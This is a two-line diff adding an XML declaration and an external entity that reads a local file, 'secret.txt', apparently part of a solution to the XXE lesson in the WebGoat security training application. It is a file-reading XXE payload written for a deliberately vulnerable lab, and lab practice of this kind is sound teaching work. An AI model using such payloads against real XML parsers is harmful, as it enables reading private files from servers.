@@ -1,0 +1,2 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY ping SYSTEM 'file:///home/webgoat/.webgoat-8.2.2//XXE/secret.txt'>
